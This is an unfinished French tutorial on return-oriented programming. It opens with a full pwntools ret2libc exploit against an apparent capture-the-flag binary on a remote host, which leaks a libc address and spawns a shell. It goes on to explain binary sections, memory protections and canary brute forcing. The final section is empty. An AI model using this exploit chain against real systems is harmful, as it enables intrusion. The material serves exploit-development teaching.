---
title: "Return-oriented programming (ROP)"
description: Article théorique et pratique sur le ROP
---

# Sommaire
1. [Les sections d'un binaire](#Les_sections)
2. [Les protections](#Les_protections)
3. [Qu'est ce que le ROP ?](#ROP)

Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout ...

```py
from pwn import *

HOST, PORT = '178.62.118.108', 30396 

#p = process('./ropme', stdin=PTY)
p = remote(HOST, PORT)
elf = ELF('./ropme')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = b'A' * 72 # offset to overwrite EBP
gadget = 0x4006d3 # pop rdi ; ret
puts_plt = elf.plt['puts'] # 0x4004e0 (PLT in GEF)
puts_got = elf.got['puts'] # 0x601018 (GOT in GEF)
addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # buffer + overwrite EBP (8 octets)
pld += p64(gadget) # 1 argument (pop rdi ; ret)
pld += p64(puts_got) # to save addr puts of GOT in rdi register
pld += p64(puts_plt) # to print puts GOT
pld += p64(addr_main) # ret2main
p.sendline(pld) # send payload

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
log.info('Addr puts (GOT) leak : {}'.format(hex(puts_leak))) # print address puts leaked

libc_puts = 0x06f690
libc_binsh = 0x18cd17
libc_system = 0x045390

libc_base = puts_leak - libc_puts # calculate addr base
log.info('libc base at ' + hex(libc_base))

addr_system = libc_base + libc_system # calculate difference between base and system function

binsh = libc_base + libc_binsh # calculate difference between base and /bin/sh

log.info('System at ' + hex(addr_system))
log.info('/bin/sh at ' + hex(binsh))

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # offset to go save EIP 
pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
pld += p64(binsh) # 
pld += p64(addr_system)

p.sendline(pld) # send payload 
p.interactive() # spawn interactive shell

p.close()
```

<div id='Les_sections'/>
# Les sections d'un binaire

Pour le ROP nous allons nous intéréssé particulièrement à ces sections :

### Global Offset Table (GOT)

La GOT (Global Offset Table) est une section qui effectue une résolution d'adresse de la libc pour un gain de temps au processeur. C'est un tableau de pointeurs qui stocke les vrais adresses des fonctions de la libc.

### Procedure Linkage Table (PLT)

La PLT (Procedure Linkage Table) est une section qui contient du code permettant de résoudre les fonctions de la libc exécutées dans le binaire. C'est une table servant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques. Cette section se trouve à des adresses fixes

### Autres sections d'un binaire

- La section TEXT contient le code du binaire
- La section BSS contient les variables non itilialisées, par exemple en C :
```c
char var[256];
```
- La section DATA contient les variables initialisées, par exemple en C : 
```c
char var[256] = "nuts";
```

<div id='Les_protections'/>
# Les protections

- NX est une protection qui rend la pile Non eXécutable, cette technique empeche l'exécution d'un shellcode dans la stack.

- Le DEP (Data Execution Prevention) consiste à protéger les zones de mémoires non exécutables. L'activation de la fonctionnalité DEP consiste à passer le bit NX à 1 dans le processeur. Il préviendra toute exécution de code dans la plage mémoire allouée aux données et remontera une exception si cela arrive. 

- L’address space layout randomization (ASLR) est une technique permettant de placer de façon aléatoire les adresses de la stack, du tas et des bibliothèques partagées.

- PIE permet de placer de facon aléatoire des emplacements mémoires (comme l'ASLR) mais cette fois ci, pour la zone de code et la zone de donnée.

- Le canary ou la Stack Smashing Protection (SSP) est une protection qui est placé entre le buffer et le couple EBP et EIP. Si la valeur du canary est réecrite alors le programme se ferme. (4 octets en 32 bits, 8 octets en 64 bits) Cependant, en assembleur nos ordinateurs vérifient octets par octets les chaines de caractères, alors nous pouvons brute force byte par byte la valeur du canary afin de la leak et de réecrire la bonne valeur du canary.

<div id='ROP'/>
# Qu'est ce que le ROP ?
